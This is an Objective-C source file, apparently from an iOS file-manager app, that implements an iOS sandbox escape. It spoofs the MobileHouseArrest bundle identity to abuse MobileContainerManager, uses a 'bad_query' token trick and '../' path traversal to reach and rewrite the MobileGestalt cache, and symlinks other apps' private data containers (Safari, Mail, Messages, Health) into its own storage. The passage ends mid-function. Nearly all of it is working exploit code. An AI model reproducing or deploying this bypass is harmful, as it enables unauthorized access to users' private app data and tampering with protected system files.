// MCMManager.m — MCM identity-bypass integration layer for FuckFile.
// Core logic ported from 0xjohnnydev/FilzaSlop MCMFilzaIntegration.m
// (https://github.com/0xjohnnydev/FilzaSlop), stripped of Filza-specific
// functionality (paste hooks, unrestricted filesystem, wallpaper lab,
// Files traversal). Identifier whitelisting and fail-closed checks kept.

#import "MCMManager.h"
#import "MCMBridge.h"
#import "BadQueryProbe.h"
#import "FFLogger.h"
#import "FFLSDiscovery.h"

#import <fcntl.h>
#import <limits.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

static const uint64_t kMCMFlags = 0x900000000ULL;
static const uint64_t kMCMReadWritePartFlags = 0x8100000000ULL;
static NSString *const kRequiredIdentifier = @"com.apple.mobile.MobileHouseArrest";

NSNotificationName const FFMCMAppLinksUpdatedNotification =
    @"FFMCMAppLinksUpdatedNotification";

// Sandbox handle consumed through the bad_query variant matrix for the
// MobileGestalt group. Kept alive for the whole process: releasing it would
// revoke the escape and the editor would go empty again.
static int64_t gBadQueryGestaltHandle = -1;

// Private LaunchServices API used only for installed-app discovery.
@interface NSObject (MCMLaunchServices)
+ (id)defaultWorkspace;
- (NSArray *)allApplications;
- (NSString *)applicationIdentifier;
- (NSString *)bundleIdentifier;
@end

static NSString *const kMCMAppDataDirectoryName = @"[MHA-C2] App Data";
static NSString *const kMCMAppGroupsDirectoryName = @"[MHA-C7] App Groups";
static NSString *const kMCMExtensionDataDirectoryName = @"[MHA-C4] Extension Data";
static NSString *const kMCMVPNDataDirectoryName = @"[MHA-C6] VPN Data";
static NSString *const kMCMServiceDataDirectoryName = @"[MHA-C10] Service Data";
static NSString *const kMCMSystemDataDirectoryName = @"[MHA-C12] System Data";
static NSString *const kMCMSystemGroupsDirectoryName = @"[MHA-C13] System Groups";
static NSString *const kMCMProtectedDataDirectoryName = @"[MHA-C15] Protected Data";
static NSString *const kMCMAdditionalLocationsDirectoryName =
    @"[MHA-C13 Scoped] Additional Locations";
static NSString *const kMCMExperimentalDirectoryName = @"[MHA-Mixed EXP] Experimental";

NSString *MCMVirtualRoot(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    return [documents stringByAppendingPathComponent:@"Device Storage"];
}

@implementation MCMManager {
    NSMutableDictionary<NSString *, MCMLease *> *_leases;
    NSMutableDictionary<NSString *, NSMutableDictionary<NSString *, NSString *> *> *_links;
    BOOL _started;
}

+ (instancetype)sharedManager
{
    static MCMManager *manager;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ manager = [MCMManager new]; });
    return manager;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        _leases = [NSMutableDictionary dictionary];
        _links = [NSMutableDictionary dictionary];
    }
    return self;
}

#pragma mark - Identifier validation

static BOOL MCMSafeIdentifier(NSString *identifier)
{
    if (identifier.length == 0 || identifier.length > 255) return NO;
    NSCharacterSet *allowed = [NSCharacterSet characterSetWithCharactersInString:
        @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"];
    return [identifier rangeOfCharacterFromSet:allowed.invertedSet].location == NSNotFound &&
        ![identifier isEqualToString:@"."] && ![identifier isEqualToString:@".."];
}

#pragma mark - Lease activation

static NSString *MCMKey(uint64_t containerClass, NSString *identifier)
{
    return [NSString stringWithFormat:@"%llu:%@", containerClass, identifier];
}

- (NSString *)activate:(uint64_t)containerClass
            identifier:(NSString *)identifier
                 group:(BOOL)group
                 error:(NSString **)error
{
    if (![NSBundle.mainBundle.bundleIdentifier isEqualToString:kRequiredIdentifier]) {
        if (error) *error = @"host bundle identifier is not the required MCM caller identity";
        return nil;
    }
    if (!MCMSafeIdentifier(identifier)) {
        if (error) *error = @"identifier contains unsupported path characters";
        return nil;
    }
    @synchronized (_leases) {
        MCMLease *existing = _leases[MCMKey(containerClass, identifier)];
        if (existing && existing.rootPath.length) return existing.rootPath;
        NSString *detail = nil;
        MCMLease *lease = [MCMLease leaseForClass:containerClass identifier:identifier
            group:group part:0 flags:kMCMFlags error:&detail];
        BOOL activated = lease && [lease activate:&detail];
        if (!lease) {
            if (error) *error = detail ?: @"MCM activation failed";
            return nil;
        }
        // iOS 26 containermanagerd lacks genericExtensionsAllowedForAll: it
        // refuses sandbox tokens for callers outside the per-class allowed
        // set, but the returned container path can still be valid. Try
        // opening it before giving up on an activation failure.
        int descriptor = open(lease.rootPath.fileSystemRepresentation,
                              O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
        if (descriptor < 0) {
            if (!activated) {
                if (error) *error = detail ?: @"MCM activation failed";
                [lease invalidate];
                return nil;
            }
            if (error) *error = [NSString stringWithFormat:
                @"container root open failed errno=%d", errno];
            [lease invalidate];
            return nil;
        }
        close(descriptor);
        if (!activated)
            FFLogTag(@"MCM", @"activation token-less but path opens class=%llu id=%@ root=%@",
                     containerClass, identifier, lease.rootPath);
        _leases[MCMKey(containerClass, identifier)] = lease;
        return lease.rootPath;
    }
}

- (NSString *)activateScoped:(uint64_t)containerClass
                  identifier:(NSString *)identifier
                       group:(BOOL)group
                        part:(uint64_t)part
                  partDomain:(NSString *)partDomain
                       flags:(uint64_t)flags
                       error:(NSString **)error
{
    if (![NSBundle.mainBundle.bundleIdentifier isEqualToString:kRequiredIdentifier]) {
        if (error) *error = @"host bundle identifier is not the required MCM caller identity";
        return nil;
    }
    if (!MCMSafeIdentifier(identifier)) {
        if (error) *error = @"identifier contains unsupported path characters";
        return nil;
    }
    NSString *key = [NSString stringWithFormat:@"%llu:%@:%llu:%@:%llx",
        containerClass, identifier, part, partDomain ?: @"", flags];
    @synchronized (_leases) {
        MCMLease *existing = _leases[key];
        if (existing && existing.rootPath.length) return existing.rootPath;
        NSString *detail = nil;
        MCMLease *lease = [MCMLease leaseForClass:containerClass
            identifier:identifier group:group part:part partDomain:partDomain
            flags:flags error:&detail];
        BOOL activated = lease && [lease activate:&detail];
        if (!lease) {
            if (error) *error = detail ?: @"scoped MCM activation failed";
            return nil;
        }
        int descriptor = open(lease.rootPath.fileSystemRepresentation,
                              O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (descriptor < 0) {
            if (!activated) {
                if (error) *error = detail ?: @"scoped MCM activation failed";
                [lease invalidate];
                return nil;
            }
            if (error) *error = [NSString stringWithFormat:
                @"scoped directory open failed errno=%d", errno];
            [lease invalidate];
            return nil;
        }
        close(descriptor);
        if (!activated)
            FFLogTag(@"MCM", @"scoped activation token-less but path opens class=%llu id=%@ part=%llu root=%@",
                     containerClass, identifier, part, lease.rootPath);
        _leases[key] = lease;
        return lease.rootPath;
    }
}

- (NSString *)dataContainerPathForIdentifier:(NSString *)identifier
                                        error:(NSString **)error
{
    return [self activate:2 identifier:identifier group:NO error:error];
}

- (NSString *)mobileGestaltPath:(NSString **)error
{
    // Fast path: the escaped path may already be reachable from a previous
    // probe run without a fresh MCM activation.
    NSArray<NSString *> *candidates = @[
        @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
        @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
    ];
    for (NSString *candidate in candidates) {
        if (access(candidate.fileSystemRepresentation, R_OK) == 0) return candidate;
    }

    NSArray<NSDictionary *> *routes = @[
        @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
          @"Group": @YES, @"Part": @3, @"Domain": @"",
          @"File": @"com.apple.MobileGestalt.plist"},
        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"Group": @NO,
          @"Part": @3,
          @"Domain": @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
          @"File": @"com.apple.MobileGestalt.plist"},
        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"Group": @NO,
          @"Part": @3, @"Domain": @"..",
          @"File": @"Caches/com.apple.MobileGestalt.plist"},
    ];
    for (NSDictionary *route in routes) {
        NSString *detail = nil;
        NSString *root = [self activateScoped:[route[@"Class"] unsignedLongLongValue]
            identifier:route[@"Identifier"] group:[route[@"Group"] boolValue]
            part:[route[@"Part"] unsignedLongLongValue]
            partDomain:[route[@"Domain"] length] ? route[@"Domain"] : nil
            flags:kMCMReadWritePartFlags error:&detail];
        if (!root) {
            FFLogTag(@"MCM", @"gestalt route FAIL class=%llu detail=%@",
                [route[@"Class"] unsignedLongLongValue], detail ?: @"(nil)");
            continue;
        }
        NSString *path = [root stringByAppendingPathComponent:route[@"File"]];
        struct stat status = {0};
        if (lstat(path.fileSystemRepresentation, &status) == 0) {
            FFLogTag(@"MCM", @"gestalt path OK %@", path);
            return path;
        }
        FFLogTag(@"MCM", @"gestalt route reached root=%@ but file missing %@ errno=%d",
            root, path, errno);
    }

    // iOS 26.6 fallback: MCM's class-13 activation is denied at token
    // issuance, but the bad_query variant matrix still issues tokens for
    // group=systemgroup.com.apple.mobilegestaltcache (flags 0x900000000 /
    // 0x800000000, part 0/3, traversal 0/1). Consume one handle per target
    // and keep it so the editor can read and rewrite the plist.
    if (gBadQueryGestaltHandle < 0) {
        NSArray<NSString *> *targets = @[
            @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
            @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
            @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache",
            @"/var/mobile/Containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
        ];
        for (NSString *target in targets) {
            NSString *detail = nil;
            FFLogTag(@"MCM", @"gestalt bad_query consume begin target=%@", target);
            int64_t handle = BadQueryConsumePath(target, nil, NO, &detail);
            if (handle >= 0) {
                gBadQueryGestaltHandle = handle;
                FFLogTag(@"MCM", @"gestalt bad_query consume OK handle=%lld target=%@",
                    handle, target);
                break;
            }
            FFLogTag(@"MCM", @"gestalt bad_query consume FAIL code=%lld target=%@ error=%@",
                handle, target, detail ?: @"(nil)");
        }
    }
    if (gBadQueryGestaltHandle >= 0) {
        for (NSString *candidate in candidates) {
            if (access(candidate.fileSystemRepresentation, R_OK) == 0) {
                FFLogTag(@"MCM", @"gestalt reachable via bad_query path=%@ handle=%lld",
                    candidate, gBadQueryGestaltHandle);
                return candidate;
            }
        }
    }

    // Last resort: the symlink bad_query creates inside Device Storage.
    NSString *escaped = [MCMVirtualRoot() stringByAppendingPathComponent:@"[BadQuery] Escaped"];
    NSArray<NSString *> *children = [[NSFileManager defaultManager]
        contentsOfDirectoryAtPath:escaped error:nil];
    for (NSString *child in children ?: @[]) {
        if ([child containsString:@"MobileGestalt"]) {
            NSString *path = [escaped stringByAppendingPathComponent:child];
            if (access(path.fileSystemRepresentation, R_OK) == 0) return path;
        }
    }
    if (error) *error = @"MobileGestalt.plist is not reachable (no MCM route granted access)";
    return nil;
}

#pragma mark - Virtual root link installation

- (void)recordLink:(NSString *)directory identifier:(NSString *)identifier target:(NSString *)target
{
    NSMutableDictionary<NSString *, NSString *> *map = _links[directory];
    if (!map) {
        map = [NSMutableDictionary dictionary];
        _links[directory] = map;
    }
    map[identifier] = target;
}

- (void)installLink:(NSString *)directory identifier:(NSString *)identifier
    containerClass:(uint64_t)containerClass group:(BOOL)group
{
    [self installLink:directory identifier:identifier containerClass:containerClass
                group:group logFailure:YES];
}

- (void)installLink:(NSString *)directory identifier:(NSString *)identifier
    containerClass:(uint64_t)containerClass group:(BOOL)group logFailure:(BOOL)logFailure
{
    NSString *error = nil;
    NSString *target = [self activate:containerClass identifier:identifier
                                group:group error:&error];
    if (!target) {
        if (logFailure)
            FFLogTag(@"MCM", @"activation FAIL class=%llu id=%@ group=%d error=%@",
                     containerClass, identifier, group, error ?: @"(nil)");
        return;
    }
    NSString *link = [directory stringByAppendingPathComponent:identifier];
    struct stat status = {0};
    if (lstat(link.fileSystemRepresentation, &status) == 0) {
        if (!S_ISLNK(status.st_mode)) return;
        char current[PATH_MAX] = {0};
        ssize_t count = readlink(link.fileSystemRepresentation, current, sizeof(current) - 1);
        if (count > 0 && [[NSString stringWithUTF8String:current] isEqualToString:target]) {
            [self recordLink:directory identifier:identifier target:target];
            return;
        }
        unlink(link.fileSystemRepresentation);
    }
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
        FFLogTag(@"MCM", @"symlink FAIL id=%@ errno=%d", identifier, errno);
        return;
    }
    [self recordLink:directory identifier:identifier target:target];
    FFLogTag(@"MCM", @"link OK class=%llu id=%@ target=%@", containerClass, identifier, target);
}

- (void)installDirectFilesystemLinks:(NSString *)directory containerRoot:(NSString *)containerRoot
{
    NSFileManager *manager = NSFileManager.defaultManager;
    NSArray<NSString *> *children = [manager contentsOfDirectoryAtPath:containerRoot error:nil];
    for (NSString *child in children ?: @[]) {
        if (!MCMSafeIdentifier(child)) continue;
        NSString *target = [containerRoot stringByAppendingPathComponent:child];
        BOOL isDirectory = NO;
        if (![manager fileExistsAtPath:target isDirectory:&isDirectory] || !isDirectory)
            continue;
        NSString *metadataPath = [target stringByAppendingPathComponent:
            @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:metadataPath];
        NSString *identifier = [metadata[@"MCMMetadataIdentifier"] isKindOfClass:NSString.class]
            ? metadata[@"MCMMetadataIdentifier"] : nil;
        if (!MCMSafeIdentifier(identifier)) identifier = child;
        NSString *link = [directory stringByAppendingPathComponent:identifier];
        struct stat status = {0};
        if (lstat(link.fileSystemRepresentation, &status) == 0) {
            if (!S_ISLNK(status.st_mode)) continue;
            unlink(link.fileSystemRepresentation);
        }
        if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0)
            FFLogTag(@"MCM", @"direct symlink FAIL id=%@ target=%@ errno=%d",
                     identifier, target, errno);
        else {
            [self recordLink:directory identifier:identifier target:target];
            FFLogTag(@"MCM", @"direct link OK id=%@ target=%@", identifier, target);
        }
    }
}

- (void)installScopedLink:(NSString *)directory linkName:(NSString *)linkName
    containerClass:(uint64_t)containerClass identifier:(NSString *)identifier
    group:(BOOL)group part:(uint64_t)part partDomain:(NSString *)partDomain
{
    NSString *link = [directory stringByAppendingPathComponent:linkName];
    NSString *error = nil;
    NSString *target = [self activateScoped:containerClass identifier:identifier
        group:group part:part partDomain:partDomain flags:kMCMReadWritePartFlags
        error:&error];
    if (!target) {
        struct stat stale = {0};
        if (lstat(link.fileSystemRepresentation, &stale) == 0 && S_ISLNK(stale.st_mode))
            unlink(link.fileSystemRepresentation);
        FFLogTag(@"MCM", @"scoped activation FAIL class=%llu id=%@ part=%llu domain=%@ error=%@",
                 containerClass, identifier, part, partDomain, error ?: @"(nil)");
        return;
    }
    struct stat status = {0};
    if (lstat(link.fileSystemRepresentation, &status) == 0) {
        if (!S_ISLNK(status.st_mode)) return;
        char current[PATH_MAX] = {0};
        ssize_t count = readlink(link.fileSystemRepresentation, current, sizeof(current) - 1);
        if (count > 0 && [[NSString stringWithUTF8String:current] isEqualToString:target]) {
            [self recordLink:directory identifier:linkName target:target];
            return;
        }
        unlink(link.fileSystemRepresentation);
    }
    if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0)
        FFLogTag(@"MCM", @"scoped symlink FAIL name=%@ errno=%d", linkName, errno);
    else {
        FFLogTag(@"MCM", @"scoped path OK name=%@ target=%@", linkName, target);
        [self recordLink:directory identifier:linkName target:target];
    }
}

#pragma mark - Identifier discovery

static NSArray<NSString *> *MCMDynamicIdentifiers(uint64_t containerClass)
{
    NSString *error = nil;
    NSArray *identifiers = MCMEnumerateIdentifiersForClass(containerClass, 1024, &error);
    FFLogTag(@"MCM", @"discovery class=%llu count=%lu detail=%@", containerClass,
             (unsigned long)identifiers.count, error ?: @"(nil)");
    NSMutableArray *safe = [NSMutableArray arrayWithCapacity:identifiers.count];
    for (NSString *identifier in identifiers)
        if (MCMSafeIdentifier(identifier)) [safe addObject:identifier];
    return safe;
}

static NSArray<NSString *> *MCMInstalledApplicationIdentifiers(void)
{
    Class workspaceClass = NSClassFromString(@"LSApplicationWorkspace");
    id workspace = [workspaceClass respondsToSelector:@selector(defaultWorkspace)]
        ? [workspaceClass defaultWorkspace] : nil;
    NSArray *applications = [workspace respondsToSelector:@selector(allApplications)]
        ? [workspace allApplications] : @[];
    NSMutableOrderedSet<NSString *> *result = [NSMutableOrderedSet orderedSet];
    for (id proxy in applications) {
        NSString *identifier = [proxy respondsToSelector:@selector(applicationIdentifier)]
            ? [proxy applicationIdentifier] : nil;
        if (!MCMSafeIdentifier(identifier) &&
            [proxy respondsToSelector:@selector(bundleIdentifier)])
            identifier = [proxy bundleIdentifier];
        if (MCMSafeIdentifier(identifier)) [result addObject:identifier];
        if (result.count >= 1024) break;
    }
    return result.array;
}

static NSArray<NSString *> *MCMResearchTargetIdentifiers(void)
{
    // Enumeration returns near-empty results on iOS 26 even though direct
    // lookups succeed. Seed known first-party identifiers so the MHA bypass
    // can resolve them by name when discovery is denied or incomplete.
    return @[
        @"com.apple.mobilesafari",
        @"com.apple.mobilenotes",
        @"com.apple.Maps",
        @"com.apple.facetime",
        @"com.apple.iBooks",
        @"com.apple.podcasts",
        @"com.apple.PosterBoard",
        @"com.apple.mobilemail",
        @"com.apple.weather",
        @"com.apple.camera",
        @"com.apple.Health",
        @"com.apple.Fitness",
        @"com.apple.tips",
        @"com.apple.Passbook",
        @"com.apple.reminders",
        @"com.apple.stocks",
        @"com.apple.news",
        @"com.apple.Home",
        @"com.apple.tv",
        @"com.apple.shortcuts",
        @"com.apple.freeform",
        @"com.apple.calculator",
        @"com.apple.MobileSMS",
        @"com.apple.InCallService",
        @"com.apple.Preferences",
        @"com.apple.springboard",
        @"com.apple.Photos",
        @"com.apple.AppStore",
        @"com.apple.Music",
        @"com.apple.Bridge",
        @"com.apple.Clock",
        @"com.apple.VoiceMemos",
        @"com.apple.Translate",
        @"com.apple.measure",
        @"com.apple.compass",
        @"com.apple.Magnifier",
        @"com.apple.DocumentsApp",
    ];
}

static NSDictionary *MCMCustomIdentifiers(void)
{
    NSString *documentsPath = [MCMVirtualRoot().stringByDeletingLastPathComponent
        stringByAppendingPathComponent:@"MCMIdentifiers.plist"];
    NSString *bundlePath = [NSBundle.mainBundle pathForResource:@"MCMIdentifiers"
                                                         ofType:@"plist"];
    NSArray<NSString *> *keys = @[
        @"AppData", @"AppGroups", @"ExtensionData", @"VPNData", @"ServiceData",
        @"SystemData", @"SystemGroups", @"ProtectedData",
    ];
    NSMutableDictionary *merged = [NSMutableDictionary dictionary];
    for (NSString *key in keys)
        merged[key] = [NSMutableOrderedSet orderedSet];
    for (NSString *path in @[bundlePath ?: @"", documentsPath]) {
        NSDictionary *value = [NSDictionary dictionaryWithContentsOfFile:path];
        if (![value isKindOfClass:NSDictionary.class]) continue;
        for (NSString *key in merged) {
            NSArray *identifiers = [value[key] isKindOfClass:NSArray.class] ? value[key] : @[];
            for (id identifier in identifiers)
                if ([identifier isKindOfClass:NSString.class] && MCMSafeIdentifier(identifier))
                    [merged[key] addObject:identifier];
        }
    }
    for (NSString *key in keys)
        merged[key] = [merged[key] array];
    return merged;
}

#pragma mark - Experimental scoped probes

static NSDictionary *MCMRunExperimentalProbe(MCMManager *manager, NSString *directory,
                                              NSDictionary *probe)
{
    NSString *name = [probe[@"Name"] isKindOfClass:NSString.class] ? probe[@"Name"] : @"Unnamed";
    uint64_t containerClass = [probe[@"Class"] unsignedLongLongValue];
    NSString *identifier = [probe[@"Identifier"] isKindOfClass:NSString.class]
        ? probe[@"Identifier"] : @"";
    BOOL group = [probe[@"Group"] boolValue];
    uint64_t part = [probe[@"Part"] unsignedLongLongValue];
    uint64_t flags = [probe[@"Flags"] unsignedLongLongValue];
    NSString *partDomain = [probe[@"PartDomain"] isKindOfClass:NSString.class]
        ? probe[@"PartDomain"] : nil;
    NSArray *expected = [probe[@"Expected"] isKindOfClass:NSArray.class] ? probe[@"Expected"] : @[];
    NSString *linkPath = [directory stringByAppendingPathComponent:name];

    NSMutableDictionary *result = [probe mutableCopy];
    result[@"FlagsHex"] = [NSString stringWithFormat:@"0x%llx", flags];
    [result removeObjectForKey:@"Flags"];
    NSString *detail = nil;
    NSString *target = [manager activateScoped:containerClass identifier:identifier
        group:group part:part partDomain:partDomain flags:flags error:&detail];
    if (!target) {
        struct stat status = {0};
        if (lstat(linkPath.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
            unlink(linkPath.fileSystemRepresentation);
        result[@"Status"] = @"failed";
        result[@"Error"] = detail ?: @"activation failed";
        FFLogTag(@"MCM", @"experimental FAIL name=%@ error=%@", name, detail ?: @"(nil)");
        return result;
    }
    result[@"ReturnedPath"] = target;
    NSMutableArray *subpaths = [NSMutableArray array];
    for (id relativeValue in expected) {
        if (![relativeValue isKindOfClass:NSString.class]) continue;
        NSString *expectedPath = [target stringByAppendingPathComponent:relativeValue];
        NSMutableDictionary *status = [NSMutableDictionary dictionary];
        status[@"RelativePath"] = relativeValue;
        struct stat st = {0};
        errno = 0;
        BOOL exists = lstat(expectedPath.fileSystemRepresentation, &st) == 0;
        status[@"Exists"] = @(exists);
        status[@"Errno"] = @(exists ? 0 : errno);
        if (exists) {
            status[@"Mode"] = [NSString stringWithFormat:@"%04o", st.st_mode & 07777];
            errno = 0;
            int fd = open(expectedPath.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
            status[@"Open"] = @(fd >= 0);
            status[@"OpenErrno"] = @(fd >= 0 ? 0 : errno);
            if (fd >= 0) close(fd);
        }
        [subpaths addObject:status];
    }
    result[@"ExpectedPathStatus"] = subpaths;
    struct stat status = {0};
    if (lstat(linkPath.fileSystemRepresentation, &status) == 0 && S_ISLNK(status.st_mode))
        unlink(linkPath.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, linkPath.fileSystemRepresentation) != 0)
        result[@"LinkError"] = [NSString stringWithFormat:@"errno=%d", errno];
    result[@"Status"] = @"linked";
    FFLogTag(@"MCM", @"experimental OK name=%@ class=%llu id=%@ part=%llu domain=%@ status=%@ target=%@",
             name, containerClass, identifier, part, partDomain, result[@"Status"], target);
    return result;
}

#pragma mark - Startup

- (void)writeAccessMap:(NSString *)root
{
    NSMutableString *map = [NSMutableString stringWithFormat:
        @"FuckFile access map\n"
        "MHA-MCM: MobileHouseArrest identity-trust bypass in MobileContainerManager.\n"
        "Device: %@\n"
        "The map records enabled roots only. It does not enumerate container contents.\n"
        "Boundary: no root, no /var/mobile, no Keychain, no TCC, no app-bundle access.\n\n",
        NSProcessInfo.processInfo.operatingSystemVersionString];
    for (NSString *category in _links) {
        [map appendFormat:@"%@\n", category];
        NSDictionary<NSString *, NSString *> *links = _links[category];
        if (links.count == 0) {
            [map appendString:@"  Enabled roots: none.\n\n"];
            continue;
        }
        for (NSString *name in links)
            [map appendFormat:@"  %@\n    root: %@\n", name, links[name]];
        [map appendString:@"\n"];
    }
    NSString *experimental = [root stringByAppendingPathComponent:kMCMExperimentalDirectoryName];
    NSString *resultsPath = [experimental stringByAppendingPathComponent:@"Probe Results.plist"];
    NSArray *results = [NSArray arrayWithContentsOfFile:resultsPath];
    if (results.count > 0) {
        [map appendString:@"Experimental returned paths:\n"];
        for (NSDictionary *result in results) {
            [map appendFormat:@"  %@ — %@\n", result[@"Name"], result[@"Status"]];
            if ([result[@"ReturnedPath"] isKindOfClass:NSString.class])
                [map appendFormat:@"    root: %@\n", result[@"ReturnedPath"]];
        }
    }
    [map writeToFile:[root stringByAppendingPathComponent:@"ACCESS MAP.txt"]
          atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

- (void)start
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        [self startOnce];
    });
}

- (void)startOnce
{
    NSString *actual = NSBundle.mainBundle.bundleIdentifier;
    if (![actual isEqualToString:kRequiredIdentifier]) {
        FFLogTag(@"MCM", @"DISABLED bundle identifier '%@' != required '%@'",
            actual, kRequiredIdentifier);
        _started = YES;
        return;
    }
    if (!MCMBridgeAvailable()) {
        FFLogTag(@"MCM", @"DISABLED ContainerManager symbols unavailable");
        _started = YES;
        return;
    }
    FFLogTag(@"MCM", @"start root=%@ bridge=OK", MCMVirtualRoot());
    NSFileManager *fm = NSFileManager.defaultManager;
    NSString *root = MCMVirtualRoot();
    NSString *apps = [root stringByAppendingPathComponent:kMCMAppDataDirectoryName];
    NSString *groups = [root stringByAppendingPathComponent:kMCMAppGroupsDirectoryName];
    NSString *extensions = [root stringByAppendingPathComponent:kMCMExtensionDataDirectoryName];
    NSString *vpnData = [root stringByAppendingPathComponent:kMCMVPNDataDirectoryName];
    NSString *serviceData = [root stringByAppendingPathComponent:kMCMServiceDataDirectoryName];
    NSString *systemData = [root stringByAppendingPathComponent:kMCMSystemDataDirectoryName];
    NSString *systemGroups = [root stringByAppendingPathComponent:kMCMSystemGroupsDirectoryName];
    NSString *protectedData = [root stringByAppendingPathComponent:kMCMProtectedDataDirectoryName];
    NSString *additionalLocations = [root stringByAppendingPathComponent:kMCMAdditionalLocationsDirectoryName];
    NSString *experimental = [root stringByAppendingPathComponent:kMCMExperimentalDirectoryName];
    for (NSString *directory in @[root, apps, groups, extensions, vpnData, serviceData,
                                  systemData, systemGroups, protectedData,
                                  additionalLocations, experimental])
        [fm createDirectoryAtPath:directory withIntermediateDirectories:YES
                       attributes:@{NSFilePosixPermissions: @0700} error:nil];

    NSMutableOrderedSet *appIdentifiers =
        [NSMutableOrderedSet orderedSetWithArray:MCMDynamicIdentifiers(2)];
    [appIdentifiers addObjectsFromArray:MCMInstalledApplicationIdentifiers()];
    [appIdentifiers addObjectsFromArray:MCMResearchTargetIdentifiers()];
    NSDictionary *custom = MCMCustomIdentifiers();
    for (id value in [custom[@"AppData"] isKindOfClass:NSArray.class] ? custom[@"AppData"] : @[])
        if ([value isKindOfClass:NSString.class] && MCMSafeIdentifier(value))
            [appIdentifiers addObject:value];
    for (NSString *identifier in appIdentifiers)
        [self installLink:apps identifier:identifier containerClass:2 group:NO];

    // iOS 26 hides third-party apps from ContainerManager/LaunchServices
    // enumeration, but the LaunchServices store inside com.apple.lsd still
    // lists every installed identifier. Extract candidates and confirm each
    // with a direct class-2 lookup; failures are silent because the store
    // scan yields thousands of stale candidates.
    //
    // Runs on a background queue: confirming thousands of candidates can
    // take seconds, and app startup must not block on it. Observers get
    // FFMCMAppLinksUpdatedNotification when the pass completes.
    NSString *lsdError = nil;
    NSString *lsdContainer = [self activate:10 identifier:@"com.apple.lsd"
        group:NO error:&lsdError];
    if (!lsdContainer.length) {
        FFLogTag(@"MCM", @"LaunchServices store container unavailable detail=%@",
                 lsdError ?: @"(nil)");
    } else {
        NSArray<NSString *> *candidates =
            FFLSDiscoverInstalledIdentifiers(lsdContainer, 4096);
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            NSUInteger confirmed = 0;
            for (NSString *identifier in candidates) {
                @synchronized (appIdentifiers) {
                    if ([appIdentifiers containsObject:identifier]) continue;
                }
                if ([self activate:2 identifier:identifier group:NO error:nil]) {
                    @synchronized (appIdentifiers) {
                        [appIdentifiers addObject:identifier];
                    }
                    confirmed++;
                }
                [self installLink:apps identifier:identifier containerClass:2
                            group:NO logFailure:NO];
            }
            FFLogTag(@"MCM", @"LaunchServices candidates=%lu newly-linked=%lu",
                     (unsigned long)candidates.count, (unsigned long)confirmed);
            [[NSNotificationCenter defaultCenter]
                postNotificationName:FFMCMAppLinksUpdatedNotification object:nil];
        });
    }

    NSMutableOrderedSet *groupIdentifiers =
        [NSMutableOrderedSet orderedSetWithArray:MCMDynamicIdentifiers(7)];
    [groupIdentifiers addObjectsFromArray:@[
        @"group.com.apple.notes",
        @"group.com.apple.safari",
        @"group.com.apple.weather",
        @"group.com.apple.stocks",
    ]];
    for (id value in [custom[@"AppGroups"] isKindOfClass:NSArray.class] ? custom[@"AppGroups"] : @[])
        if ([value isKindOfClass:NSString.class] && MCMSafeIdentifier(value))
            [groupIdentifiers addObject:value];
    for (NSString *identifier in groupIdentifiers)
        [self installLink:groups identifier:identifier containerClass:7 group:YES];

    NSMutableOrderedSet *extensionIdentifiers =
        [NSMutableOrderedSet orderedSetWithArray:MCMDynamicIdentifiers(4)];
    for (id value in [custom[@"ExtensionData"] isKindOfClass:NSArray.class] ? custom[@"ExtensionData"] : @[])
        if ([value isKindOfClass:NSString.class] && MCMSafeIdentifier(value))
            [extensionIdentifiers addObject:value];
    for (NSString *identifier in extensionIdentifiers)
        [self installLink:extensions identifier:identifier containerClass:4 group:NO];

    [self installDirectFilesystemLinks:apps containerRoot:@"/private/var/mobile/Containers/Data/Application"];
    [self installDirectFilesystemLinks:groups containerRoot:@"/private/var/mobile/Containers/Shared/AppGroup"];
    [self installDirectFilesystemLinks:extensions containerRoot:@"/private/var/mobile/Containers/Data/PluginKitPlugin"];

    // Union with the bad_query path-first enumeration: container UUIDs
    // resolved to bundle identifiers by fsgetpath + metadata plists become
    // bundle-id links here even when the class-2 direct lookup is denied.
    NSArray<NSDictionary *> *escapedIndex =
        BadQueryEscapedIndexEntries(@"App Data");
    NSUInteger unionLinks = 0;
    for (NSDictionary *entry in escapedIndex) {
        NSString *identifier = entry[@"Identifier"];
        NSString *target = entry[@"Path"];
        if (!MCMSafeIdentifier(identifier) || !target.length) continue;
        NSString *link = [apps stringByAppendingPathComponent:identifier];
        struct stat status = {0};
        if (lstat(link.fileSystemRepresentation, &status) == 0) continue;
